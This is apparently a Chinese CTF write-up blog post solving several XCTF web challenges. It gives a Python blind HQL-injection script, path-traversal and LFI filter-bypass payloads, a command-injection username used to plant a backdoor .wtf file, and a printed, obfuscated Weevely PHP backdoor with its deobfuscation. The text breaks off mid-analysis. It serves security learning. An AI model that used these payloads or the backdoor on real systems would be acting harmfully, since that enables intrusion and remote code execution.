<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com/cuitctf/action/UserLoginAction.class</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203081553566.png" alt="image-20220308155313517"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203081556294.png" alt="image-20220308155624245"></p>
<p>接着使用idea反编译,得到登录源码,这里截取了部分有用的源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">userCheck</span><span class="params">(User user)</span> &#123;</span><br><span class="line">    List&lt;User&gt; userList = <span class="built_in">this</span>.userService.loginCheck(user.getName(), user.getPassword());</span><br><span class="line">    <span class="keyword">if</span> (userList != <span class="literal">null</span> &amp;&amp; userList.size() == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.addActionError(<span class="string">&quot;Username or password is Wrong, please check!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着下载classes下面的applicationContext.xml文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">applicationContext.xml</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203081608412.png" alt="image-20220308160811364"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载userserviceimpl.class</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">loginCheck</span><span class="params">(String name, String password)</span> &#123;</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">Matcher</span> <span class="variable">username_matcher</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(name);</span><br><span class="line">    <span class="type">Matcher</span> <span class="variable">password_matcher</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(password);</span><br><span class="line">    <span class="keyword">return</span> password_matcher.find() ? <span class="built_in">this</span>.userDao.loginCheck(name, password) : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到登录的规则</p>
<p>是登陆语句的过滤规则,在UserDaoImpl.class中找到:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">loginCheck</span><span class="params">(String name, String password)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getHibernateTemplate().find(<span class="string">&quot;from User where name =&#x27;&quot;</span> + name + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    p=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        payload = <span class="string">&quot;(select%0Aascii(substr(id,&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&#x27;&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        url=<span class="string">&quot;http://111.200.241.244:62308/zhuanxvlogin?user.name=admin&#x27;%0Aor%0A&quot;</span>+payload+<span class="string">&quot;%0Aor%0Aname%0Alike%0A&#x27;admin&amp;user.password=1&quot;</span></span><br><span class="line">        r1=s.get(url)</span><br><span class="line">        <span class="comment">#print url</span></span><br><span class="line">        <span class="comment">#print len(r1.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(r1.text)&gt;<span class="number">20000</span> <span class="keyword">and</span> p!=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            flag+=p</span><br><span class="line">            <span class="built_in">print</span> i,flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p=<span class="built_in">chr</span>(j)</span><br><span class="line">        <span class="comment">#sctf&#123;C46E250926A2DFFD831975396222B08E&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="目录穿越配合代码审计写wtf脚本"><a href="#目录穿越配合代码审计写wtf脚本" class="headerlink" title="目录穿越配合代码审计写wtf脚本"></a>目录穿越配合代码审计写wtf脚本</h1><h2 id="目录穿越得到admin的cookies得到flag1"><a href="#目录穿越得到admin的cookies得到flag1" class="headerlink" title="目录穿越得到admin的cookies得到flag1"></a>目录穿越得到admin的cookies得到flag1</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101658340.png" alt="image-20220310165825228"></p>
<p>打开之后先点点看扫一下目录,做一下常规操作,目录没扫到有用的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101708346.png" alt="image-20220310170809299"></p>
<p>登录这里是用户名和密码分开验证的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101703722.png" alt="image-20220310170313682"></p>
<p>当用户名存在时验证密码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101703604.png" alt="image-20220310170354563"></p>
<p>这里可能存在注入这里直接sqlmap跑一下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101657120.png" alt="image-20220310165749047"></p>
<p>注册一个用户试试看,发现登录这里有用户名的回显,这里可能存在二次注入</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101705045.png" alt="image-20220310170543003"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101706246.png" alt="image-20220310170627204"></p>
<p>newpost这里也有回显,都用sqlmap跑一下试试看<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101706253.png" alt="image-20220310170645216"></p>
<p>链接这里也发现一个参数</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101711986.png" alt="image-20220310171138942"></p>
<p>测试了目录穿越漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:63284/post.wtf?post=./K8laH		回显正常</span><br><span class="line">http://111.200.241.244:63284/post.wtf?post=../K8laH		回显错误</span><br><span class="line">http://111.200.241.244:63284/post.wtf?post=../			直接爆文件了</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101725190.png" alt="image-20220310172544086"></p>
<p>这里搜索一下flag</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101756008.png" alt="image-20220310175621958"></p>
<p>发现在ft&#x3D;wtf中存在</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101819324.png" alt="image-20220310181927272"></p>
<p>这里需要是cookies是admin并且username&#x3D;admin才会输出flag1!在这里发现一个users有可能存放用户信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101820898.png" alt="image-20220310182035830"></p>
<p>这里经过尝试越权并不现实</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101829939.png" alt="image-20220310182914873"></p>
<p>这里的token是含盐的,既然有token这里去源码搜一下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101836173.png" alt="image-20220310183618137"></p>
<p>回头使用目录穿越找一下users文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101834419.png" alt="image-20220310183456382"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101835966.png" alt="image-20220310183504934"></p>
<p>这里发现了admin的token值,直接使用这两个值登一下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101844539.png" alt="image-20220310184426501"></p>
<p>这里登进去的页面找了一圈也没有,发现在profile下面,记得再次更改cookies登进去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag: xctf&#123;cb49256d1ab48803		这里得到flag1</span><br></pre></td></tr></table></figure>

<h2 id="代码审计写wtf脚本"><a href="#代码审计写wtf脚本" class="headerlink" title="代码审计写wtf脚本"></a>代码审计写wtf脚本</h2><p>那2呢?</p>
<p>要求上传.wtf文件，就可以控制服务器<br> 而评论功能也存在路径穿越</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function reply &#123;</span><br><span class="line"></span><br><span class="line">local post_id=$1;</span><br><span class="line">local username=$2;</span><br><span class="line">local text=$3;</span><br><span class="line">local hashed=$(hash_username &quot;$&#123;username&#125;&quot;);</span><br><span class="line">curr_id=$(for d in posts/$&#123;post_id&#125;/*; do basename $d; done | sort -n | tail -n 1);</span><br><span class="line">next_reply_id=$(awk &#x27;&#123;print $1+1&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;curr_id&#125;&quot;);</span><br><span class="line">next_file=(posts/$&#123;post_id&#125;/$&#123;next_reply_id&#125;);</span><br><span class="line">echo &quot;$&#123;username&#125;&quot; &gt; &quot;$&#123;next_file&#125;&quot;;</span><br><span class="line">echo &quot;RE: $(nth_line 2 &lt; &quot;posts/$&#123;post_id&#125;/1&quot;)&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span><br><span class="line">echo &quot;$&#123;text&#125;&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>评论功能的后台代码，也是存在路径穿越的。</p>
<p>代码把用户名写在了评论文件的内容中：echo “${username}” &gt; “${next_file}”;</p>
<p>通过上面的分析：如果用户名是一段可执行代码，而且写入的文件是 wtf 格式的，那么这个文件就能够执行我们想要的代码。 （而且<em>wtf.sh</em>只运行文件扩展名为.wtf的脚本和前缀为’$’的行）先普通地评论一下，知晓评论发送的数据包的结构，在普通评论的基础上，进行路径穿越，上传后门<code>sh.wtf</code></p>
<p>先注册一个${find,&#x2F;,-iname,get_flag2}为用户名的用户</p>
<p>这里前面加个$是wtf文件执行命令的写法 find  所有目录下   不分大小写， get_flag2的名字的文件<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101914024.png" alt="image-20220310191438989"></p>
<p>到这个回复中</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101917669.png" alt="image-20220310191706613"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101917269.png" alt="image-20220310191726241"></p>
<p>访问这个文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09是水平制表符，必须添加，不然后台会把我们的后门当做目录去解析。</span><br></pre></td></tr></table></figure>

<p>在注册这个名字$&#x2F;usr&#x2F;bin&#x2F;get_flag2</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101918568.png" alt="image-20220310191842538"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101921764.png" alt="image-20220310192147726"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101921692.png" alt="image-20220310192115662"></p>
<p>得到第二部分的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">149e5ec49d3c29ca&#125;</span><br></pre></td></tr></table></figure>

<h1 id="文件包含-目录遍历-分析Weevely后门代码-写解密函数"><a href="#文件包含-目录遍历-分析Weevely后门代码-写解密函数" class="headerlink" title="文件包含,目录遍历,分析Weevely后门代码,写解密函数"></a>文件包含,目录遍历,分析Weevely后门代码,写解密函数</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208971.png" alt="1646466067424"></p>
<p>弹出登录</p>
<p>扫一下目录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208978.png" alt="1646466135692"></p>
<p>发现</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208975.png" alt="1646466159066"></p>
<p><strong>hint.php</strong></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208974.png" alt="1646466609529"></p>
<p> &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf 说文件的配置可能有问题,该文件应该是nginx的站点核心配置文件之一</p>
<p><strong>Hack.php</strong></p>
<p>访问改文件得到一个空白页面,猜测改文件没有直接输出任何语句</p>
<p><strong>&#x2F;admin | &#x2F;admin&#x2F; |&#x2F;ad,im&#x2F;?&#x2F;login | &#x2F;admin&#x2F;index.php</strong>都显示</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208977.png" alt="1646466402867"></p>
<p><strong>&#x2F;admin&#x2F;admin.php</strong></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208987.png" alt="1646466466802"></p>
<p> 弹窗显示 <strong><code>you need to log in</code></strong> , 然后跳转到 <code>login.php</code> 页面 </p>
<p><strong>&#x2F;images</strong></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208178.png" alt="1646466558803"></p>
<p>会跳转到&#x2F;images&#x2F;并返回403,没有可以利用的点</p>
<p>基本信息收集的差不多之后,我们现在有几个可以用的点</p>
<ol>
<li><strong>&#x2F;admin&#x2F;admin.php页面</strong></li>
</ol>
<p>该页面需要登录情况下才能访问,但是我们没有账号和密码,也没有注册页面,所以账号和密码登录是不太现实的.同样爆破账号密码也不太可能.现在最理想的情况是那个地方泄露了cookie,我们可以利用这个cookie以某个用户的身份进行登录</p>
<p>​    2. <strong>&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf 文件</strong></p>
<p>这个文中给出的提示,肯定有用,但是现在无法去读取这个文件,最常用的读取文件漏洞有”文件包含”与”任意文件下载(读取)”,但是需要找到可以利用的点</p>
<p>​    3.<strong>Hack.php页面</strong></p>
<p>暂时还不知道是怎么利用但是看文件名字肯定可以利用</p>
<h2 id="本地文件包含读取Nginx配置文件"><a href="#本地文件包含读取Nginx配置文件" class="headerlink" title="本地文件包含读取Nginx配置文件"></a>本地文件包含读取Nginx配置文件</h2><p>这里发现在访问网址时都会带上一个isLogin的cookie,这里没有任何问题,但是isLogin的值被定义为”0”<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208184.png" alt="1646467732253"></p>
<p>想到cookie是用来识别用户的,维持登录状态的,这里的”0”可能表示布尔值,因此手动将其该为”isLogin&#x3D;1”</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208193.png" alt="1646468011826"></p>
<p> 然后再访问 <code>/admin/admin.php</code> , 发现我们成功登录到了站点后台 </p>
<p>后台看起来有很多选项卡 , 其实大部分都是假的 , 即使有几个选项存在页面跳转 , 也都是指向 <code>index.php</code> , 没有什么问题 .</p>
<p>在登录时发现请求了这么一个界面</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208476.png" alt="1646468601366"></p>
<p>可以发现请求的是后台文件index.php</p>
<p>其中file参数是文件名,ext参数是文件扩展名,那么这里是否存在LFI(本地文件包含漏洞)</p>
<ol>
<li><p><strong>.&#x2F;测试</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=file=./index&amp;ext=php</span><br></pre></td></tr></table></figure>

<p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208491.png" alt="1646469038225"></p>
<p> 2.<strong>..&#x2F;测试</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=file=../index&amp;ext=php</span><br></pre></td></tr></table></figure>

<p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208493.png" alt="1646469112174"></p>
</li>
</ol>
<p>响应结果和.&#x2F;完全相同,看起来..&#x2F;并没有被解析处理,或者说是被过滤掉了.</p>
<p>​    3.<strong>….&#x2F;&#x2F;测试</strong></p>
<p>​        既然..&#x2F;可能被过滤了,那么就重叠写为….&#x2F;&#x2F;这样如果是只过滤一次,并且过滤为空的话就可以绕过这个过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=file=....//&amp;ext=php</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208502.png" alt="1646469437304"></p>
<p>这里页面就发生了变化不在出现please continue,这里可能因为过滤检测后..&#x2F;index.php文件不存在.导致站点自动跳转到.&#x2F;index.php主页.因此重写法可以绕过..&#x2F;过滤</p>
<p>​    4.<strong>测试去除ext参数值</strong></p>
<p>如果HTTP请求中ext&#x3D;php是必须存在且无法更改的,那么这里利用会变得十分困难.因为我们的目标是&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf文件,而不是php文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=file=index&amp;ext=</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208500.png" alt="1646469772066"></p>
<p>没有出现please continue,因此这里看到的页面可能是因为当前目录下面的index文件不存在而强制跳转到index.php</p>
<p>​    5.**测试去除ext参数值,并在file参数中添加文件扩展名</p>
<p>​        那么如何验证上述没有出现please continue字符串是因为站点中没有找到这个文件而出现的强制跳转这个猜想是正确的呢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=file=index.php&amp;ext=</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208514.png" alt="1646470053397"></p>
<p>出现了please continue,说明读取到了当前目录下面的index.php,而前面的没有找到这个站点没有读取到index这个文件,直接跳转到了index.php,因此没有出现please continue</p>
<p>这也说明了我们上面所有的猜想都是正确的.我们可以通过重写..&#x2F;来绕过站点的过滤机制</p>
<p>现在我们可以直接读取到&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = file=....//....//....//....///etc/nginx/sites-enabled/site.conf&amp;ext= </span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208866.png" alt="1646470290737"></p>
<h2 id="目录遍历漏洞拿到webshel"><a href="#目录遍历漏洞拿到webshel" class="headerlink" title="目录遍历漏洞拿到webshel"></a>目录遍历漏洞拿到webshel</h2><p>利用上面的漏洞,我们可以读取到所有已知文件名的文件,但是我们对于哪些我们不知道的文件,就没有办法读取,必须拿到其他的利用点.所以这里开始查看配置文件根据</p>
<h3 id="Nginx的alias的用法及与root的区别"><a href="#Nginx的alias的用法及与root的区别" class="headerlink" title="Nginx的alias的用法及与root的区别"></a>Nginx的alias的用法及与root的区别</h3><ol>
<li>​    toot的用法</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /request_path/image/ &#123;</span><br><span class="line">    root /local_path/image/;</span><br><span class="line">&#125;</span><br><span class="line">这样配置的结果就是当客户端请求 /request_path/image/cat.png 的时候，</span><br><span class="line">Nginx把请求映射为/local_path/image/request_path/image/cat.png</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>alias的用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /request_path/image/ &#123;</span><br><span class="line">    alias /local_path/image/;</span><br><span class="line">&#125;</span><br><span class="line">这时候，当客户端请求 /request_path/image/cat.png 的时候，</span><br><span class="line">Nginx把请求映射为/local_path/image/cat.png</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208876.png" alt="1646474028650"></p>
</li>
</ol>
<p>这段代码给&#x2F;web-img目录设置了一个别名&#x2F;images&#x2F;,并且开启了autoindex</p>
<p> alias 用于给 localtion 指定的路径设置别名 , 在路径匹配时 , alias 会把 location 后面配置的路径丢弃掉 , 并把当前匹配到的目录指向到 alias 指定的目录 . </p>
<p>注意!alias会丢弃掉loaction的路径,因此alias后面的路径是从系统根目录开始的,然后直接跟指定的路径,他和root的用法不一样,而autoindex是一个目录浏览功能,用于列出当前目录的所有文件及子目录</p>
<p>总之,这里访问&#x2F;web-ima,就会访问系统跟目录下的&#x2F;images&#x2F;而如果在url中访问&#x2F;web-img..&#x2F;则相当于访问&#x2F;images&#x2F;..&#x2F;,也就相当于访问系统根目录.而且由于开启了autoindex,我们可以直击在浏览器里看到根目录下的所有内容</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208893.png" alt="1646474607851"></p>
<p>这就是一个目录遍历漏洞,我们可以通过他查看系统中所有文件</p>
<p>遍历目录可以在&#x2F;var&#x2F;www下找到hack.php.bak</p>
<h2 id="分析Weevely-Linux中的菜刀-后门代码"><a href="#分析Weevely-Linux中的菜刀-后门代码" class="headerlink" title="分析Weevely(Linux中的菜刀)后门代码"></a>分析Weevely(Linux中的菜刀)后门代码</h2><p>先定义多个变量,然后通过str_replace函数进行字符串的替换并拼接,接着通过create_fuction()创建了一个匿名函数,最后执行这个函数</p>
<p>str_replace()函数替换拼接后的代码就是匿名函数$f的内容因此这里输出$f,看看函数在干什么</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$U</span> = <span class="string">&#x27;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#x27;</span>;</span><br><span class="line"><span class="variable">$q</span> = <span class="string">&#x27;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#x27;</span>;</span><br><span class="line"><span class="variable">$M</span> = <span class="string">&#x27;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#x27;</span>;</span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#x27;</span>;</span><br><span class="line"><span class="variable">$k</span> = <span class="string">&#x27;?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span> = <span class="string">&#x27;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#x27;</span>;</span><br><span class="line"><span class="variable">$N</span> = <span class="string">&#x27;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#x27;</span>;</span><br><span class="line"><span class="variable">$C</span> = <span class="string">&#x27;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$j</span> = <span class="string">&#x27;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#x27;</span>;</span><br><span class="line"><span class="variable">$R</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;rO&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;rOcreatrOe_rOrOfurOncrOtion&#x27;</span>);</span><br><span class="line"><span class="variable">$J</span> = <span class="string">&#x27;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;|U&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$j</span> . <span class="variable">$o</span> . <span class="variable">$z</span> . <span class="variable">$x</span> . <span class="variable">$k</span> . <span class="variable">$M</span> . <span class="variable">$J</span> . <span class="variable">$q</span> . <span class="variable">$N</span> . <span class="variable">$U</span> . <span class="variable">$C</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>;<span class="comment">#这里</span></span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;42f7&quot;</span>;<span class="comment">#定义两个字符串</span></span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;e9ac&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)#$<span class="title">t</span>的每一项和$<span class="title">k</span>的每一项异或运算,然后循环拼接到输出变量$<span class="title">o</span>中</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#获取服务器环境变量</span></span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_SERVER</span>;<span class="comment">#获取reffer头</span></span><br><span class="line"><span class="variable">$rr</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];<span class="comment">#at符号（@）在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。如果启用了track_errors功能，则表达式生成的错误消息将保存在变量$ php_errormsg中。每个错误都会覆盖此变量。</span></span><br><span class="line"><span class="variable">$ra</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<span class="comment">#获取浏览器语言</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rr</span> &amp;&amp; <span class="variable">$ra</span>) &#123;</span><br><span class="line">    <span class="comment">#解析url</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$rr</span>);</span><br><span class="line">    <span class="comment">/*[query] =&gt; arg=value 这个是查询语句返回的数组中的键值 而下面将查询到的referer中的查询字符串解析为键值对变量,并且保存在数组$q中*/</span></span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>], <span class="variable">$q</span>);</span><br><span class="line">    <span 